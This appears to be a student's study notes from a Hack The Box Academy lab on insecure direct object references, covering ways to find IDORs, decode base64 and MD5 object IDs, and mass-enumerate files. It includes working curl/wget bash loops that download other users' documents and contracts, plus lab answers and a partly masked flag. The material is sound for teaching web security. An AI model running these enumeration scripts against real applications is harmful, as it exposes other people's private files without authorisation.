# 🎲 Insecure Direct Object References

IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. \
Let's imagine we click on a link to it such as (`download.php?file_id=123`). So, as the link directly references the file with (`file_id=123`), what would happen if we tried to access another file (which may not belong to us) with (`download.php?file_id=124`)

If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its `file_id`

## Identifying IDORs

The URL parameters or APIs with an object reference (e.g. `?uid=1` or `?filename=file_1.pdf`) are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

We can also identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls ->

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

The function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR.

***

Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead.

(`?filename=ZmlsZV8xMjMucGRm`) -> base64 -> `file_123.pdf`

We can try encoding `file_124.pdf`and try accessing it with the encoded object reference (`?filename=ZmlsZV8xMjQucGRm`)

On the other hand, the object reference may be hashed, like (`download.php?filename=c81e728d9d4c2f636f067f89cc14862c`). We cna think this is secured but if we look at the source code, we may see what is being hashed before the API call is made:

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated

Imagine a user can view their salary after making the following API call:

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

with these details at hand, we can try repeating the same API call while logged in as `User2` to see if the web application returns anything.

## Mass IDOR Enumeration

Here are some informations parameters that are vulnerable&#x20;

employee with user id `uid=1` -> can lead to data exposure and auth bypass:

Let's imagine this person has a personal document folder ->

```
http://SERVER_IP:PORT/documents.php?uid=1
```

The files of this user are pretty simple patterns ->

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

With this pattern we can easily fuzz files for other users.

We can inspect the page and look how the documents are coded:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
```

And we can curl out every files from every users with this technique and use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep` to only get the document links->

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

And go evenu further and make a look that goes and fetch every file from every employee ->

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

_**Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.**_

```
curl -X POST http://94.237.49.212:55717/documents.php -d "uid=1" | grep -oP "\/documents.*?.pdf"
```

So now we need to make the bash script ->

```
#!/bin/bash

url="http://94.237.49.212:55717"

for i in {1..20}; do
    for link in $(curl -X POST "$url/documents.php" -d "uid=$i" | grep -oP "\/documents.*?\.[a-zA-Z0-9]{2,4}"); do
        wget -q $url/$link
    done
done
```

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Bypassing Encoded References

In some cases, web applications make hashes or encode their object references, making enumeration more difficult

Let's imagine the `Employment_contract.pdf` file ->

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

We can see a `POST` request to `download.php`, it's a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks.

We can try and guess how it's hashed but it's very difficult ->

```shell-session
ElFelixi0@htb[/htb]$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

We can start looking for a link in the source code with JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

In this case, the value being hashed is `btoa(uid)`, which is the `base64` encoded string of the `uid` variable

And we cantry and replicate how the backend makes our hash ->

```shell-session
ElFelixi0@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

Then we can use bash to make a big lists of uids ->&#x20;

```shell-session
ElFelixi0@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
<SNIP>
```

And make a post request with the hashes to download the ones that exist ->

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

_**Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.**_

We see the name of the contract through the URL->

```
file:///home/htb-ac-1032889/Downloads/contract_c4ca4238a0b923820dcc509a6f75849b.pdf
```

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

So we have to make a bash script to go and download every request ->

```
#!/bin/bash

# Function to generate the URL
downloadContract() {
  uid=$1
  # Encode UID in base64
  encoded_uid=$(echo -n "$uid" | base64)
  # Encode the base64 string for URL
  url_encoded_uid=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$encoded_uid'''))")
  # Generate the URL
  wget "http://94.237.49.212:40129/download.php?contract=${url_encoded_uid}"
}

# Loop from 1 to 20 and print the URLs
for i in {1..20}; do
  downloadContract "$i"
done
```

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

```
┌─[root@htb-m9r0jjfj1n]─[/home/htb-ac-1032889/test/test2]
└──╼ #cat 'download.php?contract=MjA='
HTB{h45h1n6_1d5_w0n7_****}
```

This one was hard :joy:
